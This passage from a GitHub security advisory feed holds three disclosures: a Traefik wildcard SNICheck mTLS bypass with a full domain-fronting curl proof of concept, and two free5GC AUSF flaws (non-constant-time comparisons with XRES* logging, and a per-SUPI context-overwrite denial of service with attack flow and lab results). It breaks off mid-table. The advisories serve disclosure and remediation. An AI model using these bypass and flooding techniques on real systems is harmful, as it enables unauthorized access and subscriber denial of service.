-<pre><code class="language-go">return muxer.DomainMatchHostExpression(meta.serverName, hostExpr)
-</code></pre>
-<p>But <code>pkg/middlewares/snicheck/snicheck.go</code> resolves the host's TLS option name with exact lookups only:</p>
-<pre><code class="language-go">func findTLSOptionName(tlsOptionsForHost map[string]string, host string, fqdn bool) string {
-    name := findTLSOptName(tlsOptionsForHost, host, fqdn)
-    if name != "" {
-        return name
-    }
-
-    name = findTLSOptName(tlsOptionsForHost, strings.ToLower(host), fqdn)
-    if name != "" {
-        return name
-    }
-
-    return traefiktls.DefaultTLSConfigName
-}
-
-func findTLSOptName(tlsOptionsForHost map[string]string, host string, fqdn bool) string {
-    if tlsOptions, ok := tlsOptionsForHost[host]; ok {
-        return tlsOptions
-    }
-
-    if !fqdn {
-        return ""
-    }
-
-    if last := len(host) - 1; last &gt;= 0 &amp;&amp; host[last] == '.' {
-        if tlsOptions, ok := tlsOptionsForHost[host[:last]]; ok {
-            return tlsOptions
-        }
-
-        return ""
-    }
-
-    if tlsOptions, ok := tlsOptionsForHost[host+"."]; ok {
-        return tlsOptions
-    }
-
-    return ""
-}
-</code></pre>
-<p>There is no wildcard matching step for entries such as <code>*.example.com</code>. As a result, <code>Host: api.example.com</code> can be classified as using default TLS options even though the router matched a wildcard host with stricter <code>TLSOptions</code>.</p>
-<p>Preconditions:</p>
-<ul>
-<li>A protected router uses wildcard <code>Host</code> / <code>HostSNI</code> with router-specific <code>TLSOptions</code>.</li>
-<li>The protected wildcard router uses stricter TLS options, such as <code>RequireAndVerifyClientCert</code>.</li>
-<li>Another SNI/default TLS path on the same entrypoint allows a handshake without a client certificate.</li>
-<li>The client can send an HTTP <code>Host</code> header different from the TLS SNI.</li>
-</ul>
-<p>Relationship to my previous HTTP/3 report:</p>
-<p>I previously submitted a related HTTP/3 mTLS bypass involving <code>Router.GetTLSGetClientInfo()</code> and exact/case-sensitive SNI lookup.</p>
-<p>This report is separate. It does not require HTTP/3 or QUIC. It affects the regular HTTPS/HTTP2 path and is caused by <code>SNICheck</code> resolving <code>tlsOptionsForHost</code> with exact lookups only, without wildcard matching. The exploit uses domain fronting: a permissive TLS SNI is used for the handshake, while the HTTP request authority / <code>Host</code> header targets a wildcard-protected backend.</p>
-<p>Relationship to public issue #12349:</p>
-<p>This is related to public issue #12349, where wildcard hosts were observed to be classified as <code>default</code> by <code>SNICheck</code>, causing unexpected <code>421 Misdirected Request</code> responses in some wildcard setups:</p>
-<pre><code class="language-text">TLS options difference: SNI:https-ext@file, Header:default
-</code></pre>
-<p>The public issue demonstrates the same wildcard resolution gap as an availability/operational problem. This report demonstrates a security-impacting false-negative variant that can bypass router-specific mTLS when a permissive SNI exists on the same entrypoint. When the attacker chooses a permissive/default SNI and sends a protected wildcard host in the HTTP <code>Host</code> header, both sides can be classified as <code>default</code>, so <code>SNICheck</code> does not return <code>421</code>. The later HTTP router then matches the wildcard-protected backend and the request is forwarded without enforcing the wildcard route's mTLS policy.</p>
-<p>Related wildcard <code>SNICheck</code> behavior has also been observed in Kubernetes Ingress setups, as described in public issue #12349. The PoC below uses the file provider and v3 rule syntax to keep the reproduction minimal and self-contained.</p>
-<p>Minimal dynamic configuration:</p>
-<pre><code class="language-yaml">http:
-  routers:
-    protected:
-      rule: Host(`*.example.com`)
-      service: protected
-      tls:
-        options: mtls
-
-    public:
-      rule: Host(`public.example.net`)
-      service: public
-      tls: {}
-
-  services:
-    protected:
-      loadBalancer:
-        servers:
-          - url: http://protected:80
-
-    public:
-      loadBalancer:
-        servers:
-          - url: http://public:80
-
-tls:
-  certificates:
-    - certFile: /certs/server.crt
-      keyFile: /certs/server.key
-
-  options:
-    mtls:
-      clientAuth:
-        caFiles:
-          - /certs/ca.crt
-        clientAuthType: RequireAndVerifyClientCert
-</code></pre>
-<p>Minimal Docker Compose:</p>
-<pre><code class="language-yaml">services:
-  traefik:
-    image: traefik:v3.7.1
-    command:
-      - --log.level=DEBUG
-      - --entrypoints.websecure.address=:8443
-      - --providers.file.filename=/etc/traefik/dynamic.yml
-      - --providers.file.watch=false
-    ports:
-      - "8443:8443"
-    volumes:
-      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
-      - ./certs:/certs:ro
-    depends_on:
-      - protected
-      - public
-
-  protected:
-    image: traefik/whoami:v1.11
-    command:
-      - --name=PROTECTED
-
-  public:
-    image: traefik/whoami:v1.11
-    command:
-      - --name=PUBLIC
-</code></pre>
-<p>Certificate generation:</p>
-<pre><code class="language-bash">rm -rf certs
-mkdir -p certs
-
-openssl req -x509 -newkey rsa:2048 -nodes -days 7 \
-  -keyout certs/ca.key \
-  -out certs/ca.crt \
-  -subj "/CN=traefik-poc-ca"
-
-openssl req -newkey rsa:2048 -nodes \
-  -keyout certs/server.key \
-  -out certs/server.csr \
-  -subj "/CN=public.example.net" \
-  -addext "subjectAltName=DNS:public.example.net,DNS:api.example.com,DNS:*.example.com"
-
-openssl x509 -req \
-  -in certs/server.csr \
-  -CA certs/ca.crt \
-  -CAkey certs/ca.key \
-  -CAcreateserial \
-  -out certs/server.crt \
-  -days 7 \
-  -sha256 \
-  -copy_extensions copyall
-</code></pre>
-<h3 id="poc">PoC</h3>
-<p>Start Traefik with the configuration above.</p>
-<p>Test environment:</p>
-<ul>
-<li>Traefik images tested: <code>v3.7.0</code>, <code>v3.7.1</code></li>
-<li>Backend image: <code>traefik/whoami:v1.11</code></li>
-<li>Client: <code>curl</code> with HTTPS/HTTP2 support</li>
-<li>EntryPoint: TCP port <code>8443</code> exposed locally</li>
-<li>Provider: file provider</li>
-</ul>
-<p>Control 1: the permissive public route works normally and reaches the public backend:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 200
-Name: PUBLIC
-Host: public.example.net:8443
-</code></pre>
-<p>Control 2: direct access to the wildcard-protected host without a client certificate is blocked:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve api.example.com:8443:127.0.0.1 \
-  https://api.example.com:8443/
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">TLS alert ... certificate required
-</code></pre>
-<p>Bypass: use the permissive public SNI for the TLS handshake, but send the protected wildcard host in the HTTP request:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/ \
-  -H 'Host: api.example.com'
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 200
-Name: PROTECTED
-Host: api.example.com
-</code></pre>
-<p>The curl verbose output shows that the HTTP/2 request authority / <code>Host</code> value is <code>api.example.com</code>, while the TLS SNI is taken from the URL host <code>public.example.net</code>:</p>
-<pre><code class="language-text">* [HTTP/2] [1] [:authority: api.example.com]
-&gt; Host: api.example.com
-</code></pre>
-<p>Expected result:</p>
-<pre><code class="language-text">HTTP/2 421
-Misdirected Request
-</code></pre>
-<p>Traefik should return <code>421 Misdirected Request</code> because the HTTP <code>Host</code> header resolves to the wildcard route's <code>mtls</code> TLSOptions while the TLS SNI resolves to permissive/default TLSOptions.</p>
-<p>Negative control with exact host:</p>
-<p>Replacing the protected router rule with exact <code>Host("api.example.com")</code> while keeping <code>tls.options=mtls</code> causes the same domain-fronting request to be rejected:</p>
-<pre><code class="language-yaml">http:
-  routers:
-    protected:
-      rule: Host(`api.example.com`)
-      service: protected
-      tls:
-        options: mtls
-</code></pre>
-<p>Run the same request:</p>
-<pre><code class="language-bash">curl --noproxy '*' --http2 -skv \
-  --resolve public.example.net:8443:127.0.0.1 \
-  https://public.example.net:8443/ \
-  -H 'Host: api.example.com'
-</code></pre>
-<p>Observed result:</p>
-<pre><code class="language-text">HTTP/2 421
-Misdirected Request
-</code></pre>
-<p>This shows that the bypass depends on wildcard TLSOptions resolution in <code>SNICheck</code>, not on a generic failure of the domain-fronting check.</p>
-<p>Regression test used during validation:</p>
-<pre><code class="language-bash">go test ./pkg/middlewares/snicheck \
-  -run TestSNICheck_WildcardTLSOptionsCurrentBehavior \
-  -count=1
-</code></pre>
-<p>Version matrix observed with Docker images:</p>
-<pre><code class="language-text">v3.6.17: this file-provider wildcard PoC did not reproduce; the wildcard route returned 404 in this setup
-v3.7.0: affected
-v3.7.1: affected
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>Deployments that use wildcard router <code>TLSOptions</code> for client certificate authentication can expose protected backends to unauthenticated clients when another permissive SNI exists on the same entrypoint.</p>
-<p>The TLS handshake is completed under the permissive/default TLS options selected for the SNI, while the later HTTP router still dispatches the request to the wildcard route that was configured with mTLS-specific TLSOptions. This bypasses a security boundary that administrators can reasonably expect to be enforced by <code>tls.options=mtls</code> on the wildcard route.</p>
-<p>A possible fix would be for <code>SNICheck</code> to resolve <code>tlsOptionsForHost</code> using the same wildcard-aware host matching semantics used by the router / <code>HostSNI</code> matching, rather than exact map lookups only.</p>
-<p>Possible workarounds until a fix is available:</p>
-<ul>
-<li>Avoid wildcard router <code>TLSOptions</code> for mTLS access control.</li>
-<li>Enumerate exact protected hostnames instead of using wildcard <code>Host</code> rules.</li>
-<li>Enforce mTLS in the default TLS options as well.</li>
-<li>Avoid mixing permissive and mTLS-protected hosts on the same entrypoint.</li>
-<li>Block or reject domain-fronted requests at another layer.</li>
-</ul>
-</details>
-
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-5r4w-85f3-pw66">https://github.com/traefik/traefik/security/advisories/GHSA-5r4w-85f3-pw66</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.7.3">https://github.com/traefik/traefik/releases/tag/v3.7.3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48491">https://nvd.nist.gov/vuln/detail/CVE-2026-48491</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-48491">https://access.redhat.com/security/cve/CVE-2026-48491</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2491923">https://bugzilla.redhat.com/show_bug.cgi?id=2491923</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v2.11.48">https://github.com/traefik/traefik/releases/tag/v2.11.48</a></li>
-<li><a href="https://github.com/traefik/traefik/releases/tag/v3.6.19">https://github.com/traefik/traefik/releases/tag/v3.6.19</a></li>
-<li><a href="https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48491.json">https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-48491.json</a></li>
-<li><a href="https://github.com/advisories/GHSA-5r4w-85f3-pw66">https://github.com/advisories/GHSA-5r4w-85f3-pw66</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5r4w-85f3-pw66</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-16T19:02:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/ausf] free5GC AUSF uses non-constant-time authentication comparisons and logs XRES* in 5G-AKA]]></title>
-        <id>https://github.com/advisories/GHSA-fp46-6vfw-gc9c</id>
-        <link href="https://github.com/advisories/GHSA-fp46-6vfw-gc9c"/>
-        <updated>2026-08-28T22:26:16.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The AUSF component of free5GC compares authentication response values with normal Go equality helpers instead of constant-time cryptographic comparison functions.</p>
-<p>Two authentication flows are affected in <code>internal/sbi/processor/ue_authentication.go</code>:</p>
-<ol>
-<li>5G-AKA confirmation compares <code>RES*</code> and <code>XRES*</code> with <code>strings.EqualFold()</code>.</li>
-<li>EAP-AKA' confirmation compares <code>AT_MAC</code> with <code>bytes.Equal()</code> and compares <code>XRES</code> and <code>RES</code> with <code>==</code>.</li>
-</ol>
-<p>These functions are not designed to be constant-time cryptographic comparators and may return earlier depending on the location of the first mismatch.</p>
-<p>Additionally, the 5G-AKA confirmation path logs both the received <code>res*</code> and the expected <code>Xres*</code> at INFO level immediately before comparing them. The <code>XRES*</code> value is authentication material and should not be written to application logs.</p>
-<p>The timing side channel was confirmed as a code issue, but practical exploitation over HTTP was not demonstrated in the lab because the comparator-level signal is much smaller than HTTP/SBI noise. The <code>XRES*</code> logging issue is directly observable in AUSF logs.</p>
-<p>Confirmed on <code>github.com/free5gc/ausf</code> v1.4.4 and current main as of the May 2026 analysis.</p>
-<h3 id="details">Details</h3>
-<h4 id="5g-aka-res--xres">5G-AKA: <code>RES*</code> / <code>XRES*</code></h4>
-<p>In <code>Auth5gAkaComfirmRequestProcedure()</code>, the AUSF logs both values and then compares them with <code>strings.EqualFold()</code>:</p>
-<pre><code class="language-go">// internal/sbi/processor/ue_authentication.go
-logger.Auth5gAkaLog.Infof("res*: %x\nXres*: %x\n",
-    updateConfirmationData.ResStar, ausfCurrentContext.XresStar)
-
-if strings.EqualFold(updateConfirmationData.ResStar, ausfCurrentContext.XresStar) {
-    ausfCurrentContext.AuthStatus = models.AusfUeAuthenticationAuthResult_SUCCESS
-    confirmDataRsp.AuthResult = models.AusfUeAuthenticationAuthResult_SUCCESS
-    success = true
-    logger.Auth5gAkaLog.Infoln("5G AKA confirmation succeeded")
-    // ...
-}
-</code></pre>
-<p>For hexadecimal ASCII strings, <code>strings.EqualFold()</code> performs a character comparison that can terminate when a mismatch is found. It is not a constant-time comparison primitive.</p>
-<p>The line immediately before the comparison is more directly exploitable: it writes <code>XresStar</code> to INFO logs. Any operator, compromised sidecar, log collector, SIEM user, or local process with access to AUSF logs can read the expected response value for authentication attempts.</p>
-<h4 id="eap-aka-at_mac-xmac-xres-and-res">EAP-AKA': <code>AT_MAC</code>, <code>XMAC</code>, <code>XRES</code>, and <code>RES</code></h4>
-<p>In <code>EapAuthComfirmRequestProcedure()</code>, the AUSF computes the expected MAC and compares it with the received <code>AT_MAC</code> using <code>bytes.Equal()</code>:</p>
-<pre><code class="language-go">K_autStr := ausfCurrentContext.K_aut
-K_aut, _ := hex.DecodeString(K_autStr)
-XMAC := CalculateAtMAC(K_aut, decodeEapAkaPrimePkt.MACInput)
-MAC := decodeEapAkaPrimePkt.Attributes[ausf_context.AT_MAC_ATTRIBUTE].Value
-XRES := ausfCurrentContext.XRES
-RES := hex.EncodeToString(decodeEapAkaPrimePkt.Attributes[ausf_context.AT_RES_ATTRIBUTE].Value)
-
-if !bytes.Equal(MAC, XMAC) {
-    eapOK = false
-    eapErrStr = "EAP-AKA' integrity check fail"
-} else if XRES == RES {
-    logger.AuthELog.Infoln("Correct RES value, EAP-AKA' auth succeed")
-    // ...
-}
-</code></pre>
-<p><code>bytes.Equal()</code> is not specified as a constant-time cryptographic comparison. The subsequent <code>XRES == RES</code> string comparison is also not constant-time. The correct primitive for comparing authentication tags and secret response values in Go is <code>crypto/subtle.ConstantTimeCompare</code>, after validating and normalizing input length and encoding.</p>
-<p>The EAP-AKA' case is harder to exploit remotely than the 5G-AKA case because the <code>XRES == RES</code> comparison is reached only if <code>AT_MAC</code> is valid. Producing a valid <code>AT_MAC</code> requires session-specific <code>K_aut</code>.</p>
-<h3 id="evidence">Evidence</h3>
-<h4 id="static-evidence">Static evidence</h4>
-<p>Static analysis confirmed:</p>
-<ul>
-<li><code>strings.EqualFold(updateConfirmationData.ResStar, ausfCurrentContext.XresStar)</code> in the 5G-AKA confirmation path.</li>
-<li><code>logger.Auth5gAkaLog.Infof("res*: %x\nXres*: %x\n", ...)</code> immediately before the comparison.</li>
-<li><code>bytes.Equal(MAC, XMAC)</code> in the EAP-AKA' confirmation path.</li>
-<li><code>XRES == RES</code> in the EAP-AKA' confirmation path.</li>
-<li><code>crypto/subtle</code> is absent from the AUSF authentication processor code.</li>
-</ul>
-<p>Internal evidence:</p>
-<pre><code class="language-text">hallazgos/finding10-hres-timing/evidencia/20260526-090151-static-analysis/
-hallazgos/finding11-eap-mac-timing/evidencia/20260526-094642-static-analysis/
-</code></pre>
-<h4 id="5g-aka-timing-and-logging-evidence">5G-AKA timing and logging evidence</h4>
-<p>A timing PoC sent 500 iterations per condition over loopback HTTP/SBI:</p>
-<pre><code class="language-text">Condition A: mismatch near the start
-Condition B: mismatch in the middle
-Condition C: mismatch near the end
-Condition D: full match
-</code></pre>
-<p>The comparator-position signal was not distinguishable from HTTP noise:</p>
-<pre><code class="language-text">Delta C-A: approximately -1.5 us
-2-sigma noise threshold: approximately 557 us
-Result: SIGNAL NOT CLEAR
-</code></pre>
-<p>This is consistent with the expected signal-to-noise ratio: the comparator-level timing difference is in the nanosecond range, while the HTTP/SBI path adds hundreds of microseconds of variance.</p>
-<p>The same lab run confirmed that AUSF logs include <code>XresStar</code> in plaintext at INFO level. This does not require statistical inference.</p>
-<p>Internal evidence:</p>
-<pre><code class="language-text">hallazgos/finding10-hres-timing/evidencia/20260526-093558-timing-poc/
-</code></pre>
-<h4 id="eap-aka-timing-evidence">EAP-AKA' timing evidence</h4>
-<p>A timing PoC sent 500 iterations per condition against the EAP-AKA' confirmation path:</p>
-<pre><code class="language-text">A: first MAC byte incorrect
-B: first 8 MAC bytes correct
-C: MAC correct, XRES incorrect
-D: MAC correct, XRES correct
-</code></pre>
-<p>Observed medians were all around 464-467 us, and the HTTP-level timing signal was not detectable:</p>
-<pre><code class="language-text">A: 466.6 us
-B: 466.5 us
-C: 464.2 us
-D: 464.2 us
-Delta D-A: approximately -2.4 us
-2-sigma noise threshold: approximately 716 us
-Result: SIGNAL NOT CLEAR
-</code></pre>
-<p>This confirms the expected practical limitation of a remote HTTP timing attack.</p>
-<p>Internal evidence:</p>
-<pre><code class="language-text">hallazgos/finding11-eap-mac-timing/evidencia/20260526-103822-timing-poc/
-</code></pre>
-<h4 id="local-cpu-benchmark-for-bytesequal">Local CPU benchmark for <code>bytes.Equal()</code></h4>
-<p>A direct Go microbenchmark without HTTP overhead measured <code>bytes.Equal()</code> for 16-byte values. The raw benchmark data showed a monotonic increase as more leading bytes matched. The median delta from <code>N=0</code> matching bytes to <code>N=15</code> matching bytes was roughly 0.31 ns, or more than 20%.</p>
-<p>This confirms that the local comparator is not position-independent at CPU level, even though the signal is too small to exploit remotely over HTTP in normal conditions.</p>
-<p>Internal evidence:</p>
-<pre><code class="language-text">hallazgos/finding11-eap-mac-timing/evidencia/20260526-104842-cpu-benchmark/
-</code></pre>
-<h4 id="uprobe-path-confirmation">Uprobe path confirmation</h4>
-<p>Linux uprobes on the live AUSF process confirmed that requests reach the relevant comparison paths:</p>
-<ul>
-<li>MAC comparison path is hit for both failing and successful EAP-AKA' attempts.</li>
-<li>XRES comparison path is hit only when MAC verification passes.</li>
-</ul>
-<p>Internal evidence:</p>
-<pre><code class="language-text">hallazgos/finding11-eap-mac-timing/evidencia/20260526-053510-ebpf-uprobe/
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>There are two impact classes.</p>
-<h4 id="sensitive-value-in-logs">Sensitive value in logs</h4>
-<p>The 5G-AKA path logs <code>XRES*</code>, the expected response value, at INFO level. In deployments where AUSF logs are collected centrally or are readable by lower-privileged operators, infrastructure agents, compromised containers, or log-processing systems, this exposes authentication material that should remain internal to the authentication procedure.</p>
-<p>The exact exploitability depends on whether the attacker can correlate log access with an active authentication context and submit the confirmation before the context is consumed or failed. Regardless, writing <code>XRES*</code> to application logs is an unsafe handling of authentication material.</p>
-<h4 id="timing-side-channel--cryptographic-hardening-issue">Timing side channel / cryptographic hardening issue</h4>
-<p>The non-constant-time comparisons are real code issues and should be fixed, but we did not demonstrate a practical remote timing oracle over HTTP/SBI. The measured comparator signal is too small relative to HTTP noise in the lab.</p>
-<p>The risk is higher in environments where an attacker has a lower-noise measurement point, local co-residency, kernel tracing capabilities, or another side channel that can observe the comparison more directly.</p>
-<h3 id="suggested-remediation">Suggested remediation</h3>
-<ol>
-<li><p>Remove <code>XRES*</code>, <code>RES*</code>, <code>XRES</code>, <code>RES</code>, <code>K_aut</code>, <code>AT_MAC</code>, and derived authentication material from INFO logs. If logging is necessary, log only metadata such as the authentication context ID, SUPI/SUCI in redacted form, result, and failure class.</p>
-</li>
-<li><p>Replace <code>strings.EqualFold()</code> and string <code>==</code> comparisons for authentication values with constant-time comparisons.</p>
-</li>
-<li><p>Normalize encodings before comparison. For hex-encoded values, decode both inputs first, validate expected lengths, and then compare fixed-size byte slices.</p>
-</li>
-</ol>
-<p>Example for 5G-AKA:</p>
-<pre><code class="language-go">resStar, err1 := hex.DecodeString(updateConfirmationData.ResStar)
-xresStar, err2 := hex.DecodeString(ausfCurrentContext.XresStar)
-
-if err1 == nil &amp;&amp; err2 == nil &amp;&amp;
-    len(resStar) == len(xresStar) &amp;&amp;
-    subtle.ConstantTimeCompare(resStar, xresStar) == 1 {
-    // success
-} else {
-    // failure
-}
-</code></pre>
-<p>Example for EAP-AKA' MAC:</p>
-<pre><code class="language-go">if len(MAC) != len(XMAC) || subtle.ConstantTimeCompare(MAC, XMAC) != 1 {
-    eapOK = false
-    eapErrStr = "EAP-AKA' integrity check fail"
-}
-</code></pre>
-<p>Example for EAP-AKA' XRES:</p>
-<pre><code class="language-go">res, err1 := hex.DecodeString(RES)
-xres, err2 := hex.DecodeString(XRES)
-
-if err1 == nil &amp;&amp; err2 == nil &amp;&amp;
-    len(res) == len(xres) &amp;&amp;
-    subtle.ConstantTimeCompare(res, xres) == 1 {
-    // success
-}
-</code></pre>
-<ol start="4">
-<li><p>Add unit tests that ensure authentication values are not written to logs.</p>
-</li>
-<li><p>Consider avoiding a second UDM notification call in the 5G-AKA failure path if the first failure notification already reports the result. In the lab, failure performed two UDM calls while success performed one; this creates a coarse success/failure timing difference, although that result is already visible through the API response.</p>
-</li>
-</ol>
-<h3 id="prior-art--non-duplication-note">Prior art / non-duplication note</h3>
-<p>Known recent free5GC AUSF issues such as CVE-2026-33063 concern different failure modes and code paths. This report concerns cryptographic comparison and logging behavior in <code>internal/sbi/processor/ue_authentication.go</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/free5gc/free5gc/security/advisories/GHSA-fp46-6vfw-gc9c">https://github.com/free5gc/free5gc/security/advisories/GHSA-fp46-6vfw-gc9c</a></li>
-<li><a href="https://github.com/free5gc/ausf/commit/7a5a4aa1ec6cd0e1febebf333911c3104968edf0">https://github.com/free5gc/ausf/commit/7a5a4aa1ec6cd0e1febebf333911c3104968edf0</a></li>
-<li><a href="https://github.com/advisories/GHSA-fp46-6vfw-gc9c">https://github.com/advisories/GHSA-fp46-6vfw-gc9c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fp46-6vfw-gc9c</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-08-28T22:26:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/free5gc/ausf] free5GC AUSF authentication contexts can be overwritten by concurrent requests for the same SUPI]]></title>
-        <id>https://github.com/advisories/GHSA-334q-h5g3-fpxv</id>
-        <link href="https://github.com/advisories/GHSA-334q-h5g3-fpxv"/>
-        <updated>2026-08-28T22:24:13.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The AUSF component of free5GC stores per-subscriber authentication state in a global <code>sync.Map</code> keyed only by SUPI. Every incoming authentication request creates a new <code>AusfUeContext</code> and stores it under that SUPI key without checking whether an authentication procedure is already in progress and without generating a per-session unique identifier.</p>
-<p>An attacker with access to the AUSF SBI/N12 interface can send concurrent <code>POST /nausf-auth/v1/ue-authentications</code> requests for the same target SUPI. Each request is accepted and overwrites the previous authentication context. A valid EAP-AKA' response for an earlier challenge is then verified against the latest overwritten context, whose <code>K_aut</code>, <code>XRES</code>, and <code>EapID</code> no longer match the challenge. The result is a targeted authentication denial of service for that SUPI while the request flood is maintained.</p>
-<p>This issue was confirmed on <code>github.com/free5gc/ausf</code> v1.4.4 and current main as of June 2026.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable context pool is defined in <code>internal/context/context.go</code>.</p>
-<p><code>UePool</code> is a <code>sync.Map</code>, which makes individual map operations safe, but it does not make the authentication procedure state safe. The problem is the session design: the key is only the SUPI, and <code>Store()</code> unconditionally replaces any active context for that SUPI.</p>
-<pre><code class="language-go">type AUSFContext struct {
-    suciSupiMap sync.Map
-    UePool      sync.Map
-    // ...
-}
-
-type AusfUeContext struct {
-    Supi string
-    // ...
-
-    // for EAP-AKA'
-    K_aut    string
-    XRES     string
-    Rand     string
-    EapID    uint8
-    Resynced bool
-}
-
-func NewAusfUeContext(identifier string) (ausfUeContext *AusfUeContext) {
-    ausfUeContext = new(AusfUeContext)
-    ausfUeContext.Supi = identifier
-    return ausfUeContext
-}
-
-func AddAusfUeContextToPool(ausfUeContext *AusfUeContext) {
-    ausfContext.UePool.Store(ausfUeContext.Supi, ausfUeContext)
-}
-</code></pre>
-<p>The vulnerable sequence is executed for every authentication request in <code>internal/sbi/processor/ue_authentication.go</code>:</p>
-<pre><code class="language-go">ueid := authInfoResult.Supi
-ausfUeContext := ausf_context.NewAusfUeContext(ueid)
-ausfUeContext.ServingNetworkName = snName
-ausfUeContext.AuthStatus = models.AusfUeAuthenticationAuthResult_ONGOING
-ausfUeContext.UdmUeauUrl = udmUrl
-ausf_context.AddAusfUeContextToPool(ausfUeContext)
-</code></pre>
-<p>There is no guard such as <code>LoadOrStore</code>, no <code>AUTHENTICATION_IN_PROGRESS</code> response, no rate limit per SUPI, and no unique authentication-session ID in the context URL. For EAP-AKA', the returned context URL is derived directly from the SUCI/SUPI path:</p>
-<pre><code class="language-text">/nausf-auth/v1/ue-authentications/{suci}/eap-session
-</code></pre>
-<p>All concurrent authentication attempts for the same subscriber therefore point to the same logical context URL, while the backing <code>AusfUeContext</code> in <code>UePool</code> is repeatedly replaced.</p>
-<p>When the EAP response is later processed, the AUSF looks up the current context by SUPI:</p>
-<pre><code class="language-go">currentSupi := ausf_context.GetSupiFromSuciSupiMap(eapSessionID)
-ausfCurrentContext := ausf_context.GetAusfUeContext(currentSupi)
-</code></pre>
-<p>The EAP-AKA' response is then verified against the current context's <code>K_aut</code> and <code>XRES</code>:</p>
-<pre><code class="language-go">K_autStr := ausfCurrentContext.K_aut
-XMAC := CalculateAtMAC(K_aut, decodeEapAkaPrimePkt.MACInput)
-MAC := decodeEapAkaPrimePkt.Attributes[ausf_context.AT_MAC_ATTRIBUTE].Value
-XRES := ausfCurrentContext.XRES
-RES := hex.EncodeToString(decodeEapAkaPrimePkt.Attributes[ausf_context.AT_RES_ATTRIBUTE].Value)
-
-if !bytes.Equal(MAC, XMAC) {
-    eapOK = false
-    eapErrStr = "EAP-AKA' integrity check fail"
-} else if XRES == RES {
-    logger.AuthELog.Infoln("Correct RES value, EAP-AKA' auth succeed")
-    // ...
-}
-</code></pre>
-<p>If another request has overwritten the context between challenge issuance and response processing, the legitimate response is checked against the wrong <code>K_aut</code> and fails the AT_MAC verification.</p>
-<h3 id="attack-flow">Attack flow</h3>
-<p>The attack is selective for a target SUPI:</p>
-<ol>
-<li>The legitimate procedure starts and the AUSF stores <code>ctx_LEGIT</code> under <code>UePool[target_supi]</code>.</li>
-<li>The attacker sends many concurrent authentication requests for the same target SUCI/SUPI.</li>
-<li>Each request obtains a new authentication vector and stores a new context under the same SUPI key.</li>
-<li><code>ctx_LEGIT</code> is overwritten by <code>ctx_ATTACK</code>.</li>
-<li>The legitimate EAP response, computed with <code>K_aut_LEGIT</code>, reaches <code>/eap-session</code>.</li>
-<li>The AUSF retrieves <code>ctx_ATTACK</code> by SUPI and computes <code>XMAC</code> with <code>K_aut_ATTACK</code>.</li>
-<li>AT_MAC verification fails and the AUSF returns an EAP-AKA' notification failure.</li>
-</ol>
-<p>When later contexts carry different session material, a continuous flood prevents the target subscriber from completing authentication because the AUSF's stored context keeps changing before the response is processed.</p>
-<h3 id="poc-and-evidence">PoC and evidence</h3>
-<p>The issue was reproduced in two phases in a controlled free5GC lab.</p>
-<h4 id="phase-1-context-overwrite">Phase 1: context overwrite</h4>
-<p>Experiment:</p>
-<ul>
-<li>3 rounds of 8 concurrent <code>POST /nausf-auth/v1/ue-authentications</code> requests.</li>
-<li>Same target SUCI: <code>suci-0-001-01-0-0-0-0000000002</code>.</li>
-<li>AUSF listening on <code>0.0.0.0:8100</code>; PoC connected to <code>127.0.0.1:8100</code>.</li>
-</ul>
-<p>Observed result:</p>
-<ul>
-<li>24/24 requests returned HTTP 201.</li>
-<li>24 distinct EapIDs were issued:</li>
-</ul>
-<pre><code class="language-text">[131, 11, 157, 99, 182, 232, 127, 228, 119, 36, 104, 10,
- 107, 61, 66, 26, 110, 9, 210, 202, 53, 224, 237, 86]
-</code></pre>
-<ul>
-<li>All responses used the same auth context URL:</li>
-</ul>
-<pre><code class="language-text">/nausf-auth/v1/ue-authentications/suci-0-001-01-0-0-0-0000000002/eap-session
-</code></pre>
-<ul>
-<li>AUSF logs showed repeated context creation for the same SUCI/SUPI in a short interval:</li>
-</ul>
-<pre><code class="language-text">Add SuciSupiPair (suci-0-001-01-0-0-0-0000000002, imsi-001010000000002) to map.
-Use EAP-AKA' auth method
-| 201 | POST | /nausf-auth/v1/ue-authentications
-...
-</code></pre>
-<p>This confirms that concurrent authentication requests for the same SUPI are accepted independently but collapse onto one shared context key.</p>
-<h4 id="phase-2-valid-eap-response-fails-after-overwrite">Phase 2: valid EAP response fails after overwrite</h4>
-<p>The second PoC used a mock UDM with h2c support that returns different EAP-AKA' vectors by request counter for the same SUCI. This makes the overwrite directly observable:</p>
-<table>
-<thead>
-<tr>
